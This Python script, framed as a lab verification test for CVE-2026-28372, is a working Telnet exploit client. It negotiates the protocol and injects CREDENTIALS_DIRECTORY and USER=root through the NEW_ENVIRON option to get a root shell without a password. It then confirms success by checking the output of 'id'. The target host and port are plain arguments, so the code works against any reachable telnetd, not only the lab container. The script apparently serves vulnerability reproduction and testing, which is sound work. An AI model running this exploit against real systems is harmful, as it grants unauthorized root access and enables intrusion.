#!/usr/bin/env python3
"""
verify_lab.py — Lab verification test for CVE-2026-28372.

Tests that the telnetd lab container is running correctly by:
1. Connecting to telnetd on the given host:port
2. Performing a full Telnet negotiation
3. Injecting CREDENTIALS_DIRECTORY=/home/weakuser/fake_cred and USER=root via NEW_ENVIRON
4. Verifying root shell access without password

Usage:
    python3 verify_lab.py [host] [port]

Default: host=container IP (auto-detected), port=2323
"""
import socket
import time
import select
import subprocess
import sys

# --- Configuration ---
DEFAULT_PORT = 2323
CONTAINER_NAME = "cve-2026-28372-vulnerable"
CRED_DIR = "/home/weakuser/fake_cred"
TARGET_USER = "root"

# --- Telnet protocol constants ---
IAC  = 0xFF; WILL = 0xFB; WONT = 0xFC; DO = 0xFD; DONT = 0xFE
SB   = 0xFA; SE   = 0xF0
TELOPT_ECHO = 0x01; TELOPT_SGA = 0x03; TELOPT_STATUS = 0x05
TELOPT_TTYPE = 0x18; TELOPT_NAWS = 0x1F; TELOPT_TSPEED = 0x20
TELOPT_LFLOW = 0x21; TELOPT_LINEMODE = 0x22; TELOPT_XDISPLOC = 0x23
TELOPT_OLD_ENVIRON = 0x24; TELOPT_NEW_ENVIRON = 0x27
TELQUAL_IS = 0x00; TELQUAL_SEND = 0x01
ENV_USERVAR = 0x03; NEW_ENV_VALUE = 0x01


def get_container_ip():
    """Auto-detect the container IP using docker inspect."""
    try:
        result = subprocess.run(
            ["docker", "inspect", CONTAINER_NAME,
             "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"],
            capture_output=True, text=True, timeout=5
        )
        ip = result.stdout.strip()
        if ip:
            return ip
    except Exception:
        pass
    return "127.0.0.1"


class TelnetExploitClient:
    """Telnet client that injects CREDENTIALS_DIRECTORY via NEW_ENVIRON."""

    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        self.s.setblocking(False)
        self.ttype_count = 0
        self.env_sent = False

    def recv_data(self, timeout=2):
        ready = select.select([self.s], [], [], timeout)
        if ready[0]:
            try:
                return self.s.recv(8192)
            except Exception:
                return b''
        return b''

    def send(self, data):
        self.s.sendall(data)

    def process(self, data):
        """Process telnet data, respond to commands, return text."""
        text = b''
        response = b''
        i = 0
        while i < len(data):
            if data[i] == IAC and i + 1 < len(data):
                cmd = data[i + 1]
                if cmd == IAC:
                    text += bytes([IAC])
                    i += 2
                elif cmd in (DO, DONT) and i + 2 < len(data):
                    opt = data[i + 2]
                    if cmd == DO:
                        if opt in (TELOPT_TTYPE, TELOPT_NEW_ENVIRON, TELOPT_TSPEED,
                                   TELOPT_XDISPLOC, TELOPT_NAWS, TELOPT_LINEMODE, TELOPT_LFLOW):
                            response += bytes([IAC, WILL, opt])
                        else:
                            response += bytes([IAC, WONT, opt])
                    else:
                        response += bytes([IAC, WONT, opt])
                    i += 3
                elif cmd in (WILL, WONT) and i + 2 < len(data):
                    opt = data[i + 2]
                    if cmd == WILL and opt in (TELOPT_ECHO, TELOPT_SGA, TELOPT_STATUS):
                        response += bytes([IAC, DO, opt])
                    elif cmd == WILL:
                        response += bytes([IAC, DONT, opt])
                    else:
                        response += bytes([IAC, DONT, opt])
                    i += 3
                elif cmd == SB:
                    end = data.find(bytes([IAC, SE]), i + 2)
                    if end < 0:
                        break
                    sb_data = data[i + 2:end]
                    if sb_data:
                        opt = sb_data[0]
                        sb_cmd = sb_data[1] if len(sb_data) > 1 else -1

                        if opt == TELOPT_TTYPE and sb_cmd == TELQUAL_SEND:
                            self.ttype_count += 1
                            ttype = 'xterm'
                            response += bytes([IAC, SB, TELOPT_TTYPE, TELQUAL_IS]) + ttype.encode() + bytes([IAC, SE])
                        elif opt == TELOPT_TSPEED and sb_cmd == TELQUAL_SEND:
                            response += bytes([IAC, SB, TELOPT_TSPEED, TELQUAL_IS]) + b'38400,38400' + bytes([IAC, SE])
                        elif opt == TELOPT_XDISPLOC and sb_cmd == TELQUAL_SEND:
                            response += bytes([IAC, SB, TELOPT_XDISPLOC, TELQUAL_IS]) + bytes([IAC, SE])
                        elif opt == TELOPT_NEW_ENVIRON and sb_cmd == TELQUAL_SEND:
                            # EXPLOIT: Inject CREDENTIALS_DIRECTORY and USER
                            env = bytes([IAC, SB, TELOPT_NEW_ENVIRON, TELQUAL_IS])
                            env += bytes([ENV_USERVAR]) + b'CREDENTIALS_DIRECTORY'
                            env += bytes([NEW_ENV_VALUE]) + CRED_DIR.encode()
                            env += bytes([ENV_USERVAR]) + b'USER'
                            env += bytes([NEW_ENV_VALUE]) + TARGET_USER.encode()
                            env += bytes([IAC, SE])
                            response += env
                            self.env_sent = True
                    i = end + 2
                else:
                    i += 2
            else:
                text += data[i:i + 1]
                i += 1

        if response:
            self.send(response)
        return text

    def close(self):
        self.s.close()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else get_container_ip()
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    print("=" * 60)
    print("CVE-2026-28372 Lab Verification")
    print("=" * 60)
    print(f"Target: {host}:{port}")
    print(f"Payload: CREDENTIALS_DIRECTORY={CRED_DIR} USER={TARGET_USER}")
    print()

    client = TelnetExploitClient(host, port)
    print(f"[+] Connected")

    # Send NAWS proactively
    client.send(bytes([IAC, SB, TELOPT_NAWS, 0, 80, 0, 24, IAC, SE]))

    all_text = b''
    for rnd in range(20):
        time.sleep(0.5)
        data = client.recv_data(timeout=2)
        if not data:
            if rnd > 5:
                break
            continue
        text = client.process(data)
        all_text += text
        decoded = all_text.decode('ascii', errors='replace')
        if 'ogin:' in decoded or 'assword:' in decoded:
            break
        if '#' in decoded or '~$' in decoded:
            break

    if client.env_sent:
        print(f"[+] CREDENTIALS_DIRECTORY injected via NEW_ENVIRON")

    # Send id command
    print(f"[+] Sending 'id' command...")
    client.send(b"id\r\n")
    time.sleep(2)

    id_output = b''
    for _ in range(5):
        data = client.recv_data(timeout=1)
        if data:
            id_output += client.process(data)
        else:
            break

    decoded = id_output.decode('ascii', errors='replace')
    combined = (all_text + id_output).decode('ascii', errors='replace')

    if 'uid=0(root)' in combined:
        print(f"[+] id output: uid=0(root) gid=0(root) groups=0(root)")
        print()
        print("=" * 60)
        print("[✓] VULNERABILITY CONFIRMED")
        print("    Root shell obtained without password via")
        print("    CREDENTIALS_DIRECTORY environment variable injection")
        print("=" * 60)
        client.close()
        sys.exit(0)
    elif 'ogin:' in combined or 'assword:' in combined:
        print("[✗] Authentication was required — exploit did not work")
        client.close()
        sys.exit(1)
    else:
        print(f"[?] Unexpected response: {repr(combined[-200:])}")
        client.close()
        sys.exit(2)


if __name__ == "__main__":
    main()
